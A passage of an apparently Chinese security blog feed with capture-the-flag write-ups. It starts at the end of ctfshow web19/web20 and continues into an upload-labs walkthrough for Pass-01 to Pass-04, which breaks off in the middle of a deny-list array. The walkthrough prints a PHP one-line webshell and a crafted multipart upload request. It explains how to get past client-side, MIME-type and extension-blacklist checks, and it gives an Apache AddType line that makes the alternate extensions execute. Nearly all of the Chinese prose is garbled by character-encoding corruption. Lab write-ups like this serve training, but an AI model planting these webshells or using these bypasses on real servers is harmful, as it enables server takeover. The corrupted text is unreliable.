class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›´æ¥æ ¹æ®æç¤ºpostä¼ å…¥è´¦å·å¯†ç å³å¯ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663807340-ae78657e-3980-404f-af6d-9b57d1a4b7c7.png" alt="image.png"></p><h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><blockquote><p>mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚</p></blockquote><p>mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ ç›´æ¥æŸ¥çœ‹urlè·¯å¾„æ·»åŠ /db/db.mdb ä¸‹è½½æ–‡ä»¶é€šè¿‡txtæ‰“å¼€æˆ–è€…é€šè¿‡EasyAccess.exeæ‰“å¼€æœç´¢flag flag{ctfshow_old_database}<br>è™½ç„¶å†…å®¹ä¹±ç äº†ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥æœç´¢flagå­—æ®µæ¥æ‰¾åˆ°flagã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677664080200-59170fc9-2d27-41ea-9514-447d48d68017.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uploads-labä¹‹æ—…</title>
      <link href="/2023/03/12/uploads-lab%E4%B9%8B%E6%97%85/"/>
      <url>/2023/03/12/uploads-lab%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<p>å‡†å¤‡ææ–™ï¼š</p><ul><li>phpstudyï¼š<a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></li><li>uploads-labï¼š<a href="https://gitcode.net/mirrors/tj1ngwe1/upload-labs?utm_source=csdn_github_accelerator">https://gitcode.net/mirrors/tj1ngwe1/upload-labs?utm_source=csdn_github_accelerator</a></li></ul><h4 id="uploads-labçš„æ­å»º"><a href="#uploads-labçš„æ­å»º" class="headerlink" title="uploads-labçš„æ­å»º"></a>uploads-labçš„æ­å»º</h4><p>uploads-labä¸‹è½½ä¸ºzipæ–‡ä»¶ï¼Œå¹¶è§£å‹åœ¨phpstudyä¸‹çš„wwwæ–‡ä»¶å¤¹å†…ï¼Œæ³¨æ„å°†æ–‡ä»¶å¤¹é‡å‘½åä¸ºuploads-labã€‚<br>è§£å‹æˆåŠŸåè®¿é—® <a href="http://127.0.0.1/upload-labs">http://127.0.0.1/upload-labs</a> æ‰“å¼€å³å¯(PS:éƒ¨åˆ†äººburpsuiteå¯èƒ½ä½¿ç”¨æœ¬æœºåœ°å€æ— æ³•æŠ“åŒ…ï¼Œå»ºè®®127.0.0.1ä¿®æ”¹ä¸ºæœ¬æœºåœ°å€ï¼)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673542456881-755e93e5-08db-4264-893b-3434505bba58.png" alt="image.png"></p><h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p>ä»»åŠ¡ï¼šä¸Šä¼ ä¸€ä¸ª<code>webshell</code>åˆ°æœåŠ¡å™¨ã€‚<br>é¦–å…ˆå…ˆå°è¯•ç›´æ¥ä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬<code>webshell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">eval</span>(_POST[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ å¤±è´¥ï¼Œæç¤ºï¼šè¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ .jpg|.png|.gifç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š.php<br>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_ invoke__">substring</span>(file.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_ invoke__">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>f12æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æŠŠå‡½æ•°æ”¾åœ¨äº†å‰ç«¯<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673544303968-26e4e437-558e-4377-b9cb-d552fc971cc2.png" alt="image.png"></p><h2 id="æ–¹æ³•ä¸€-ç¦ç”¨js"><a href="#æ–¹æ³•ä¸€-ç¦ç”¨js" class="headerlink" title="æ–¹æ³•ä¸€ ç¦ç”¨js"></a>æ–¹æ³•ä¸€ ç¦ç”¨js</h2><p>ç›´æ¥æµè§ˆå™¨ç¦ç”¨js<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673545764014-6f3370b8-3730-4849-8d0e-57c5a2741143.png" alt="image.png"><br>ä¸Šä¼ æˆåŠŸï¼Œç”¨antswordæµ‹è¯•è¿æ¥ï¼ŒæˆåŠŸ<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673546203765-a912ec10-9c39-4ed9-a479-d91042847e7f.png" alt="b4797b0734fbfd3618d946ec7938912.png"></p><h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>ä¿®æ”¹æ–‡ä»¶åç¼€åä¸º<code>webshell.png</code>ä¸Šä¼ ï¼Œæ‰“å¼€burpsuiteæŠ“åŒ…ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673546459582-bb57208f-a5e1-4b13-aec7-00f92787e614.png" alt="image.png"><br>å°†filenameå‚æ•°ä¿®æ”¹æ–‡ä»¶åç¼€<code>.php</code><br>ç”¨antswordæµ‹è¯•è¿æ¥ï¼ŒæˆåŠŸ</p><h2 id="æ–¹æ³•ä¸‰ï¼ˆé‡è¦ï¼‰"><a href="#æ–¹æ³•ä¸‰ï¼ˆé‡è¦ï¼‰" class="headerlink" title="æ–¹æ³•ä¸‰ï¼ˆé‡è¦ï¼‰"></a>æ–¹æ³•ä¸‰ï¼ˆé‡è¦ï¼‰</h2><p>å³é”®é¡µé¢-æŸ¥çœ‹ç½‘ç«™æºä»£ç -å…¨éƒ¨å¤åˆ¶ä¸‹æ¥-ä¿å­˜ä¸ºhtmlåç¼€æ–‡ä»¶ï¼Œæ‰¾åˆ°æ–‡ä»¶ä¸­çš„jsä»£ç ï¼Œåˆ é™¤ã€‚åˆ é™¤ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">alert</span>(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.<span class="title function_ invoke__">substring</span>(file.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.<span class="title function_ invoke__">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;</span><br><span class="line">            <span class="title function_ invoke__">alert</span>(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ—¶æˆ‘ä»¬è¿è¡Œè¿™ä¸ªHTMLæ–‡ä»¶ï¼ŒUIä»ç„¶ä¼šæ˜¾ç¤ºï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬å·²ç»åˆ é™¤äº†jså‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸çŸ¥é“è¦å°†æ–‡ä»¶ä¼ åˆ°å“ªé‡Œã€‚<br>æˆ‘ä»¬å›åˆ°åŸç½‘é¡µï¼Œå³é”®é¡µé¢-æ£€æŸ¥-ç½‘ç»œï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œçœ‹åˆ°ä¸Šä¼ çš„å›¾ç‰‡çš„è¯·æ±‚ç½‘å€ã€‚ï¼ˆè¿™ä¸€æ­¥ç”¨burpsuiteä¹Ÿå¯ä»¥ï¼‰<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673609137323-2d967bd6-143f-41ce-b1da-dc95476ccd17.png" alt="7c0ae6a5a632a3866408524ad8e7a72.png"><br>çŸ¥é“è¯·æ±‚ç½‘å€äº†å°±å¯ä»¥ç»™htmlæ–‡ä»¶æ·»åŠ actionäº†ï¼Œactionæ˜¯å‘Šè¯‰ä»–è¿™ä¸ªå›¾ç‰‡æäº¤ç»™è°ï¼Œå› ä¸ºè¿™ä¸ªæºä»£ç ä¸­æ²¡æœ‰ï¼Œæˆ‘ä»¬å°±è‡ªå·±åŠ ä¸€ä¸ªã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673609254796-cf64222b-d921-4e97-93cf-19ce4510b673.png" alt="7c0ae6a5a632a3866408524ad8e7a72.png"><br>æ·»åŠ å¥½ä¹‹åé‡æ–°è¿è¡Œhtmlæ–‡ä»¶ï¼Œå†ä¸Šä¼ <code>webshell.php</code>æ–‡ä»¶ï¼Œç›´æ¥å°±å¯ä»¥ä¸Šä¼ æˆåŠŸã€‚</p><h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><p>è¦æ±‚ï¼šä¸Šä¼ ä¸€ä¸ª<code>webshell</code>åˆ°æœåŠ¡å™¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//åˆ¤æ–­æ˜¯å¦ä¸Šä¼ submitå‚æ•°</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">//æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="comment">//å…è®¸ä¼ è¾“ .jpg/.png/.gif åç¼€æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="è§£æ³•"><a href="#è§£æ³•" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p>è¿™ä¸€å…³æ˜¯å¸¸è§éªŒè¯ä¸­çš„æ–‡ä»¶ç±»å‹éªŒè¯ï¼Œä¹Ÿå°±æ˜¯éªŒè¯MIMEä¿¡æ¯ï¼Œå°†<code>webshell.php</code>æ”¹ä¸º<code>webshell.png</code>ï¼Œå¹¶ä¸Šä¼ ï¼Œåœ¨burpæŠ“åŒ…å¤„ä¿®æ”¹æ–‡ä»¶åä¸º<code>webshell.php</code>ï¼Œå³å¯ä¸Šä¼ æˆåŠŸï¼Œantswordè¿æ¥æµ‹è¯•æˆåŠŸã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673605350606-8477e614-1e6f-42f6-83e0-611ea73de702.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">------WebKitFormBoundary09G9BBRK49OTlzSH</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;webshell.png&quot;</span><span class="comment">//å°†è¿™é‡Œä¿®æ”¹ä¸ºwebshell.php</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥ä¸Šä¼ <code>webshell.php</code>æ–‡ä»¶ï¼Œå› ä¸ºæ£€æµ‹çš„æ˜¯<code>Content-Type</code>å‚æ•°ï¼Œæ‰€ä»¥ç›´æ¥å°†å…¶ä¿®æ”¹ä¸º<code>image/jpeg</code>ã€<code>image/png</code>ã€<code>image/gif</code>ä¸‰ç§ä¹‹ä¸€å³å¯ã€‚</p><h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//å®šä¹‰submitå‚æ•°</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span>. <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                 <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-1"><a href="#è§£æ³•-1" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p>è¿™æ¬¡æ˜¯å±è”½äº†æ‰€æœ‰çš„<code>.asp</code>ã€<code>.aspx</code>ã€<code>.php</code>ã€<code>.jsp</code>æ–‡ä»¶ï¼Œä½†æ˜¯é»‘åå•å®šä¹‰ä¸å®Œå…¨æ˜¯å¯ä»¥ç»•è¿‡çš„å¯ä»¥ç”¨<code>.phtml</code>ã€<code>.phps</code>ã€<code>.php5</code>ã€<code>.pht</code>è¿›è¡Œç»•è¿‡ã€‚æ¯”å¦‚å°†æ–‡ä»¶åæ”¹ä¸º<code>webshell.php5</code>ä¸Šä¼ ã€‚<br>ä½†æ˜¯è¦æƒ³ä¸Šä¼ åèƒ½æ‰§è¡Œï¼Œè¦åœ¨è‡ªå·±çš„<code>apache</code>çš„<code>httpd.conf</code>æ–‡ä»¶å†™å…¥ï¼Œåœ¨<code>D:\ä½ å®‰è£…çš„ä½ç½®\phpstudy_pro\Extensions\Apache2.4.39\conf</code>é‡Œå†™å…¥ï¼š<br><code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code><br>è¿™æ ·å°±æˆåŠŸä¼ è¾“å’Œä½¿ç”¨äº†ã€‚</p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p><strong>å¦‚æœè¿™æ ·è¿˜æ˜¯ä¸è¡Œçš„è¯ï¼Œå°±æ˜¯phpç‰ˆæœ¬çš„é—®é¢˜ï¼Œéœ€è¦å°†Ntsç‰ˆæœ¬æ¢ä¸ºtsç‰ˆæœ¬ï¼š</strong><a href="https://www.cnblogs.com/Article-kelp/p/14927087.html"><strong>https://www.cnblogs.com/Article-kelp/p/14927087.html</strong></a></p><h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span 